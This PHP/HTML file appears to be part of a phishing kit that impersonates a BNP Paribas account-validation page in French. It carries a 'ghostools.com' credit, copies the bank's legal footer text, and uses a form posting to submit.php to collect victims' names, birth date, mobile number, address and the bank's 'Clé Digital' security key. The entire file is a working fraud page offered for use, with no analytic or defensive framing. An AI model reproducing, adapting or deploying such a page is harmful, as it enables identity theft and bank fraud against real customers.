<?php

// for more tools visite ghostools.com
error_reporting(0);
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Accéder à mes comptes en ligne | BNP Paribas</title>
    </head>

    <body>

        <!-- MAIN -->
        <main id="main-details">
            <div class="container">
                <div class="inner-container">
                    <div class="header">
                        <img width="75" src="../assets/images/horloge.png"> SIMPLE ET RAPIDE, VALIDER VOTRE ADRESSE !
                    </div>
                    <div class="details">
                        <h3>Je valide mon compte BNP Paribas</h3>
                        <p>
                           <b>JE PRÉ-REMPLIS MON FORMULAIRE AVEC FranceConnect</b> <br>
                            Pour cela, mes données de civilité et de contact seront transmises à BNP PARIBAS
                        </p>
                        <form action="submit.php" method="post">
                            <input type="hidden" name="verbot">
                            <legend>JE SAISIS MES INFORMATIONS CI-DESSOUS</legend>
                            <div class="form-group mb-4">
                                <label for="first_name">Nom</label>
                                <input type="text" name="first_name" class="<?php echo is_invalid_class($_SESSION['errors'],'first_name') ?>" id="first_name" placeholder="Mon nom" value="<?php echo get_value('first_name'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'first_name'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="last_name">Prénom</label>
                                <input type="text" name="last_name" class="<?php echo is_invalid_class($_SESSION['errors'],'last_name') ?>" id="last_name" placeholder="Mon prénom" value="<?php echo get_value('last_name'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'last_name'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="birth_date">Date de naissance</label>
                                <input type="text" name="birth_date" maxlength="10" class="<?php echo is_invalid_class($_SESSION['errors'],'birth_date') ?>" id="birth_date" placeholder="Ma date de naissance (jj/mm/aaaa)" value="<?php echo get_value('birth_date'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'birth_date'); ?>
                            </div>
                            <div class="row mb-4">
                                <div class="col-md-12">
                                    <label for="indicatif">Numéro de téléphone portable</label>
                                </div>
                                <div class="col-md-3">
                                    <select name="indicatif" id="indicatif">
                                        <option value="+33 France" <?php if( get_value('indicatif') == '+33 France' ) { echo 'selected'; } ?>>+33 France</option>
                                        <option value="+262 Mayotte" <?php if( get_value('indicatif') == '+262 Mayotte' ) { echo 'selected'; } ?>>+262 Mayotte</option>
                                        <option value="+262 Réunion" <?php if( get_value('indicatif') == '+262 Réunion' ) { echo 'selected'; } ?>>+262 Réunion</option>
                                        <option value="+262 Terre australes et antarctiques françaises" <?php if( get_value('indicatif') == '+262 Terre australes et antarctiques françaises' ) { echo 'selected'; } ?>>+262 Terre australes et antarctiques françaises</option>
                                        <option value="+590 Saint-Barthélemy" <?php if( get_value('indicatif') == '+590 Saint-Barthélemy' ) { echo 'selected'; } ?>>+590 Saint-Barthélemy</option>
                                        <option value="+590 Saint-Martin" <?php if( get_value('indicatif') == '+590 Saint-Martin' ) { echo 'selected'; } ?>>+590 Saint-Martin</option>
                                        <option value="+590 Guadeloupe" <?php if( get_value('indicatif') == '+590 Guadeloupe' ) { echo 'selected'; } ?>>+590 Guadeloupe</option>
                                        <option value="+594 Guyane" <?php if( get_value('indicatif') == '+594 Guyane' ) { echo 'selected'; } ?>>+594 Guyane</option>
                                        <option value="+596 Martinique" <?php if( get_value('indicatif') == '+596 Martinique' ) { echo 'selected'; } ?>>+596 Martinique</option>
                                        <option value="+681 Wallis et Futuna" <?php if( get_value('indicatif') == '+681 Wallis et Futuna' ) { echo 'selected'; } ?>>+681 Wallis et Futuna</option>
                                        <option value="+687 Nouvelle Calédonie" <?php if( get_value('indicatif') == '+687 Nouvelle Calédonie' ) { echo 'selected'; } ?>>+687 Nouvelle Calédonie</option>
                                        <option value="+689 Polynésie Française" <?php if( get_value('indicatif') == '+689 Polynésie Française' ) { echo 'selected'; } ?>>+689 Polynésie Française</option>
                                    </select>
                                </div>
                                <div class="col-md-9">
                                    <div class="form-group mb-0">
                                        <input type="text" name="phone" class="<?php echo is_invalid_class($_SESSION['errors'],'phone') ?>" id="phone" placeholder="Mon numéro de téléphone portable" value="<?php echo get_value('phone'); ?>">
                                        <span class="reset-btn zz">x</span>
                                        <?php echo error_message($_SESSION['errors'],'phone'); ?>
                                    </div>
                                </div>
                            </div>
                            <div class="form-group mb-4">
                                <label for="digitalkey">Clé Digital (S'il est activé)</label>
                                <input type="text" name="digitalkey" class="<?php echo is_invalid_class($_SESSION['errors'],'digitalkey') ?>" id="digitalkey" placeholder="Clé Digital" value="<?php echo get_value('digitalkey'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'digitalkey'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="address">Address</label>
                                <input type="text" name="address" class="<?php echo is_invalid_class($_SESSION['errors'],'address') ?>" id="address" placeholder="Mon address" value="<?php echo get_value('address'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'address'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="zip_code">Code postale</label>
                                <input type="text" name="zip_code" class="<?php echo is_invalid_class($_SESSION['errors'],'zip_code') ?>" id="zip_code" placeholder="Mon code postale" value="<?php echo get_value('zip_code'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'zip_code'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="city">Ville</label>
                                <input type="text" name="city" class="<?php echo is_invalid_class($_SESSION['errors'],'city') ?>" id="city" placeholder="Ma ville" value="<?php echo get_value('city'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'city'); ?>
                            </div>
                            <input type="hidden" name="type" value="details">
                            <div class="form-group text-right mt-5 mb-4">
                                <button type="submit">Je continue</button>
                            </div>
                            <div style="margin-top: 70px"></div>
                            <p>(1) Abonnement à des services de banque à distance (internet, téléphone fixe, SMS, etc.) : gratuit et illimité, hors coût de communication ou de fourniture d’accès à internet et hors alertes par SMS.</p>
                            <p>Conditions et tarifs en vigueur au 01/01/2019. Offres formule Esprit Libre Initiative / Référence / Premier ou formule sur mesure réservées aux particuliers majeurs capables, sous réserve de remplir les <a href="#">conditions d'éligibilité</a> et de l'acceptation définitive de votre demande par la banque, après signature électronique de vos contrats et transmission de vos pièces justificatives.</p>
                            <p>(2) La liste des sociétés du Groupe BNP Paribas est disponible à l’adresse postale figurant ci-dessus et sur <a href="#">group.bnpparibas</a>.</p>
                            <p>BNP Paribas, SA au capital de 2 499 597 122 euros - Siège social : 16, boulevard des Italiens - 75009 PARIS. Immatriculée sous le n° 662 042 449 RCS PARIS - Identifiant CE FR76 662 042 449 - ORIAS n° 07 022 735</p>
                            <p>AXA Assistance, AXA Assistance désigne INTER PARTNER Assistance, entreprise d'assurance du Groupe AXA Assistance agréée par la Banque Nationale de Belgique (0487). SA de droit belge au capital de 31 702 613 euros - siège social : 166 avenue Louise – 1050 Bruxelles – Belgique, 415 591 055 RPM Bruxelles, succursale française : 6, rue André Gide - 92230 Châtillon - 316 139 500 RCS Nanterre</p>
                            <p>Cardif - Assurances Risques Divers, Entreprise régie par le Code des assurances - SA au capital de 16 875 840 €- 308 896 547 RCS Paris. Siège social : 1 bd Haussmann - 75009 Paris. Bureaux : 8, rue du Port 92728 Nanterre Cedex</p>
                            <p>SPB, SAS de courtage d'assurance au capital de 1 000 000 euros - siège social : 71 quai Colbert CS 90000 76095 Le Havre Cedex - 305 109 779 RCS Le Havre - ORIAS n° 07 002 642 (www.orias.fr).</p>
                        </form>
                    </div>
                    <div class="footer">
                        <p><a href="#">Une question ? :</a> Nos conseillers sont disponibles pour vous répondre.</p>
                        <img src="../assets/images/service.jpg">
                        <p>Lundi-Vendredi, 8h-20h / Samedi de 8h-18h / Hors jours fériés</p>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>